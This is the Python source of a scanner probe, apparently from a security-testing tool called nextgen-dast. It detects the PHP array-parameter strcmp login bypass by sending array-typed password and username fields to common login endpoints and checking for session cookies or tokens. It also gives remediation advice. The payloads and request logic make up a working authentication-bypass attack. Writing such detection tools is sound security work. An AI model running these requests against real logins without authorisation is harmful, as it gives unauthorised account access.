#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
PHP type juggling: array-parameter strcmp / loose-compare bypass.

Sending a parameter as `name[]=value` instead of `name=value` causes
PHP to populate `$_POST['name']` (or `$_GET['name']`) as an array.
When the application's auth code does:

  if (strcmp($input, $stored) == 0) { /* logged in */ }

PHP's `strcmp()` returns NULL (with a warning) when called on a
non-string, and `NULL == 0` is true. Result: passing
`password[]=anything` bypasses the comparison.

The same flaw exists in `strcasecmp`, `strpos`, and any other string
function whose return value gets compared with `==`. PDO
`fetchAssoc` followed by `==` is also vulnerable to a related class
where the array element compares loosely.

We POST login attempts where the password (or username) is sent as
an array. Validation requires:
  (a) status 200 (or 302/303 to a post-login URL);
  (b) presence of an explicit auth-success indicator -- a
      session-shaped Set-Cookie OR a token field in the JSON body.

Detection signal:
  POST login with `password[]=anything` and `username[]=admin`;
  validate only when the response carries an explicit auth-success
  indicator (Set-Cookie name match OR token field in body).
"""
from __future__ import annotations

import json
import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

LOGIN_PATHS = (
    "/rest/user/login",
    "/api/login",
    "/api/auth/login",
    "/login",
    "/users/login",
    "/auth/login",
)

SUCCESS_BODY_RE = re.compile(
    r'"(?:authentication|token|access_token|jwt|session)"\s*:\s*"',
    re.I)
COOKIE_AUTH_RE = re.compile(
    r"^(?:JSESSIONID|PHPSESSID|connect\.sid|session|auth_token|"
    r"access_token|token)=", re.I)


def _hdr(headers: dict, name: str) -> str:
    name_l = name.lower()
    for k, v in headers.items():
        if k.lower() == name_l:
            return v
    return ""


class PhpArrayParamStrcmpBypassProbe(Probe):
    name = "php_array_param_strcmp_bypass"
    summary = ("Detects PHP login bypass when password / username "
               "is sent as an array parameter (`password[]=anything`).")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--target-email", default="admin@juice-sh.op",
            help="Email / username to attempt against (must be a "
                 "documented seed account).")
        parser.add_argument(
            "--login-path", action="append", default=[],
            help="Additional login endpoint to test (repeatable).")

    def _looks_authenticated(self, status: int, headers: dict,
                              body: bytes) -> tuple[bool, str]:
        if status not in (200, 302, 303):
            return False, f"non-success-status:{status}"
        sc = _hdr(headers, "Set-Cookie")
        if sc and COOKIE_AUTH_RE.match(sc.lstrip()):
            return True, f"auth-cookie:{sc.split('=', 1)[0]}"
        if body:
            text = body.decode("utf-8", "replace")
            if SUCCESS_BODY_RE.search(text):
                return True, "auth-token-in-body"
        return False, "no-auth-indicator"

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        login_paths = list(LOGIN_PATHS) + list(args.login_path or [])

        # Discover live endpoints first.
        live: list[str] = []
        attempts: list[dict] = []
        for p in login_paths:
            r = client.request("GET", urljoin(origin, p))
            attempts.append({"step": "discovery", "path": p,
                             "status": r.status})
            if r.status not in (404, 0) and len(live) < 2:
                live.append(p)
            if len(live) >= 2:
                break

        if not live:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: no candidate login endpoints "
                         f"reachable on {origin}."),
                evidence={"origin": origin, "attempts": attempts},
            )

        # Two payload shapes:
        #   1. JSON body where password is an array: {"password": ["x"]}
        #   2. form body where the field is repeated: password[]=x
        # Both trigger the same PHP type-juggling bug if present.
        confirmed: dict | None = None
        payloads = (
            ("json-password-array",
             "application/json",
             json.dumps({
                 "email": args.target_email,
                 "username": args.target_email,
                 "password": ["anything"],
             }).encode()),
            ("json-username-array",
             "application/json",
             json.dumps({
                 "email": [args.target_email],
                 "username": [args.target_email],
                 "password": "anything",
             }).encode()),
            ("form-password-array",
             "application/x-www-form-urlencoded",
             ("email=" + args.target_email
              + "&username=" + args.target_email
              + "&password%5B%5D=anything").encode()),
        )
        for path in live:
            for label, ctype, body in payloads:
                url = urljoin(origin, path)
                r = client.request("POST", url, headers={
                    "Content-Type": ctype}, body=body)
                ok_, reason = self._looks_authenticated(
                    r.status, r.headers, r.body)
                row = {"step": "array-param", "path": path,
                       "payload": label, "content_type": ctype,
                       "status": r.status, "reason": reason}
                if ok_:
                    confirmed = row
                    attempts.append(row)
                    break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin,
                    "target_email": args.target_email,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.93,
                summary=(
                    f"Confirmed: login on {origin}{confirmed['path']} "
                    f"accepted an array-typed credential field "
                    f"(`{confirmed['payload']}`) and returned an "
                    f"auth-success indicator ({confirmed['reason']}). "
                    "The endpoint's comparison logic returns NULL "
                    "for arrays, and NULL `==` 0 is true in PHP."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Validate parameter types before comparison:\n"
                    "  ```php\n"
                    "  if (!is_string($input)) { fail(); }\n"
                    "  if (hash_equals($stored_hash, "
                    "hash('sha256', $input))) { /* ok */ }\n"
                    "  ```\n"
                    "Replace any `strcmp(...) == 0` / `== 0` with "
                    "`=== 0` and validate input shape first. Use "
                    "`password_verify()` for password checks -- it "
                    "is type-strict by design.\n"
                    "After remediation, audit logs for "
                    "`password[]=` patterns and force-rotate "
                    "credentials for any account that may have "
                    "been logged into via this path."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(payloads)} array-typed "
                     f"payloads against {len(live)} login endpoint(s) "
                     f"on {origin}; none returned an auth-success "
                     "indicator."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PhpArrayParamStrcmpBypassProbe().main()
